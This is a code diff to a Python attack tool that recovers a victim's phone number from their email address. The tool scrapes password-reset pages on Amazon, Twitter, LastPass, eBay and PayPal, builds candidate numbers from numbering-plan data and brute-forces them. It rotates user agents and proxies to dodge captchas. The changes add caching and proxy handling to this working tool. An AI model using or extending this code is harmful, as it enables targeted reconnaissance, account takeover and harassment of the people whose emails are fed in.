@@ -13,12 +13,12 @@ import urllib
 from itertools import product
 from bs4 import BeautifulSoup
 
+requests.packages.urllib3.disable_warnings()
+
 GREEN = '\033[92m'
 YELLOW = '\033[93m'
 RED = '\033[91m'
 ENDC = '\033[0m'
-
-requests.packages.urllib3.disable_warnings()
 
 userAgents = [	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
 				"Opera/9.80 (J2ME/MIDP; Opera Mini/7.1.32052/29.3417; U; en) Presto/2.8.119 Version/11.10",
@@ -29,8 +29,9 @@ userAgents = [	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KH
 				"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)",
 				"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"]
 
-proxyList = []
+proxyList = False
 verifyProxy = False
+poolingCache = {} # To cache results from nationalpooling website and save bandwith
 
 
 
@@ -52,7 +53,7 @@ def getMaskedEmailWithAmazon(phoneNumbers, victimEmail, verbose):
 
 	for phoneNumber in phoneNumbers:
 		userAgent = random.choice(userAgents) # Pick random user agents to help prevent captchas
-		proxy = random.choice(proxyList)
+		proxy = random.choice(proxyList) if proxyList else None
 
 		session = requests.Session()
 		response = session.get("https://www.amazon.com/ap/forgotpassword?openid.assoc_handle=usflex",
@@ -195,7 +196,7 @@ def getMaskedEmailWithTwitter(phoneNumbers, victimEmail, verbose):
 
 	for phoneNumber in phoneNumbers:
 		userAgent = random.choice(userAgents) # Pick random user agents to help prevent captchas
-		proxy = random.choice(proxyList)
+		proxy = random.choice(proxyList) if proxyList else None
 
 		session = requests.Session()
 		response = session.get("https://twitter.com/account/begin_password_reset",
@@ -292,7 +293,7 @@ def scrapeLastpass(email):
 	
 	print "Scraping Lastpass..."
 	userAgent = random.choice(userAgents)
-	proxy = random.choice(proxyList)
+	proxy = random.choice(proxyList) if proxyList else None
 
 	session = requests.Session()
 	response = session.get("https://lastpass.com/recover.php",
@@ -349,7 +350,7 @@ def scrapeEbay(email):
 
 	print "Scraping Ebay..."
 	userAgent = random.choice(userAgents)
-	proxy = random.choice(proxyList)
+	proxy = random.choice(proxyList) if proxyList else None
 
 	session = requests.Session()
 	response = session.get("https://fyp.ebay.com/EnterUserInfo?ru=https%3A%2F%2Fwww.ebay.com%2F&gchru=&clientapptype=19&rmvhdr=false",
@@ -416,7 +417,7 @@ def scrapePaypal(email):
 
 	print "Scraping Paypal..."
 	userAgent = random.choice(userAgents)
-	proxy = random.choice(proxyList)
+	proxy = random.choice(proxyList) if proxyList else None
 
 	session = requests.Session()
 	response = session.get("https://www.paypal.com/authflow/password-recovery/",
@@ -536,6 +537,8 @@ def scrapePaypal(email):
 
 # Returns all possible valid phone numbers according to NANPA based on a partial phone number
 def getPossiblePhoneNumbers(maskedPhone):
+	global poolingCache
+
 	possiblePhoneNumbers = []
 	nanpaFileUrl = "https://www.nationalnanpa.com/nanp1/allutlzd.zip"
 
@@ -557,22 +560,35 @@ def getPossiblePhoneNumbers(maskedPhone):
 	remainingX = maskedPhone[7:].count("X")
 	maskedPhoneFormatted = maskedPhone[7:].replace("X","{}")
 	for possibleAreacodeExchange in possibleAreacodeExchanges:
-		if maskedPhone[6] == 'X': # Check for available block numbers for that area code and exchange
-			blockNumbers = getValidBlockNumbers(possibleAreacodeExchange[0], possibleAreacodeExchange[1].split("-")[0], possibleAreacodeExchange[1].split("-")[1])
-		else:
-			blockNumbers = [maskedPhone[6]]
+		state = possibleAreacodeExchange[0]
+		areacode = possibleAreacodeExchange[1].split("-")[0]
+		exchange = possibleAreacodeExchange[1].split("-")[1]
+
+		if areacode not in poolingCache:
+			cacheValidBlockNumbers(state, areacode)
 		
+		if maskedPhone[6] == 'X': # Check for available block numbers for that area code and exchange
+			blockNumbers = poolingCache[areacode][exchange]['blockNumbers']
+		else: # User provided blocknumber
+			if areacode in poolingCache and exchange in poolingCache[areacode] and maskedPhone[6] not in poolingCache[areacode][exchange]['blockNumbers']: # User provided invalid block number
+				blockNumbers = []
+			else:
+				blockNumbers = [maskedPhone[6]]
+					
 		for blockNumber in blockNumbers: # Add the rest of random subscriber number digits
 			for x in product("0123456789", repeat=remainingX):
-				possiblePhoneNumbers.append(possibleAreacodeExchange[1][:3] + possibleAreacodeExchange[1][4:] + blockNumber + maskedPhoneFormatted.format(*x))
+				possiblePhoneNumbers.append(areacode + exchange + blockNumber + maskedPhoneFormatted.format(*x))
 
 	return possiblePhoneNumbers
 
 
 
-def getValidBlockNumbers(state, areacode, exchange):
+def cacheValidBlockNumbers(state, areacode):
 	global userAgents
 	global proxyList
+	global poolingCache
+
+	proxy = random.choice(proxyList) if proxyList else None
 
 	session = requests.Session()
 	session.get("https://www.nationalpooling.com/pas/blockReportSelect.do?reloadModel=N") # We need the cookies or it will error
@@ -591,7 +607,7 @@ def getValidBlockNumbers(state, areacode, exchange):
 						"&npaId=" + areacode +
 						"&rtCntrId=" + "ALL" +
 						"&reportType=" + "3",
-					proxies = random.choice(proxyList),
+					proxies = proxy,
 					verify = verifyProxy)
 
 	soup = BeautifulSoup(response.text, 'html.parser')
@@ -599,18 +615,29 @@ def getValidBlockNumbers(state, areacode, exchange):
 	areacodeCells = soup.select("form table td:nth-of-type(1)")
 	for areaCodeCell in areacodeCells:
 		if areaCodeCell.string and areaCodeCell.string.strip() == areacode:
-			exhangeCell = areaCodeCell.next_sibling.next_sibling
-			if exhangeCell.string and exhangeCell.string.strip() == exchange:
-				blockNumberCell = exhangeCell.next_sibling.next_sibling
-				availableBlockNumbers.append(blockNumberCell.string.strip())
+			exchange = areaCodeCell.next_sibling.next_sibling.string.strip()
+			blockNumber = areaCodeCell.next_sibling.next_sibling.next_sibling.next_sibling.string.strip()
+			
+			if areacode not in poolingCache:
+				poolingCache[areacode] = {}
+				poolingCache[areacode][exchange] = {}
+				poolingCache[areacode][exchange]['blockNumbers'] = []
+			elif exchange not in poolingCache[areacode]:
+				poolingCache[areacode][exchange] = {}
+				poolingCache[areacode][exchange]['blockNumbers'] = []
 
-	return [n for n in ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"] if n not in availableBlockNumbers] # return block numbers that are NOT available
+			poolingCache[areacode][exchange]['blockNumbers'].append(blockNumber) # Temporarely we store the invalid blocknumbers
+
+	for areacode in poolingCache: # Let's switch invalid blocknumbers for valid ones
+		for exchange in poolingCache[areacode]:
+			poolingCache[areacode][exchange]['blockNumbers'] = [n for n in ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"] if n not in poolingCache[areacode][exchange]['blockNumbers']]
 
 
 
 def setProxyList(fileHandler):
 	global proxyList
 
+	proxyList = []
 	fileContent = f.read()
 	fileContent = filter(None, fileContent) # Remove last \n if needed
 	proxyListUnformatted = fileContent.split("\n")
@@ -699,27 +726,9 @@ elif args.action=="bruteforce":
 		f = open(args.proxies, "r")
 		if not f.mode == 'r': exit(RED + "Could not read file " + args.proxies + ENDC)
 		setProxyList(f)
-	
-
-	# threadPayloadLen = len(possiblePhoneNumbers)/4
-	# p1 = multiprocessing.Process(target=startBruteforcing, args=(possiblePhoneNumbers[:threadPayloadLen], args.email, args.quiet, args.verbose,))
-	# p2 = multiprocessing.Process(target=startBruteforcing, args=(possiblePhoneNumbers[threadPayloadLen:threadPayloadLen*2], args.email, args.quiet, args.verbose,))
-	# p3 = multiprocessing.Process(target=startBruteforcing, args=(possiblePhoneNumbers[threadPayloadLen*2:threadPayloadLen*3], args.email, args.quiet, args.verbose,))
-	# p4 = multiprocessing.Process(target=startBruteforcing, args=(possiblePhoneNumbers[threadPayloadLen*3:], args.email, args.quiet, args.verbose,))
-	# p1.start()
-	# p2.start()
-	# p3.start()
-	# p4.start()
-	# p1.join()
-	# p2.join()
-	# p3.join()
-	# p4.join()
 
 	startBruteforcing(possiblePhoneNumbers, args.email, args.quiet, args.verbose)
 
 
 else:
 	exit(RED + "action not recognized" + ENDC)
-
-
-	
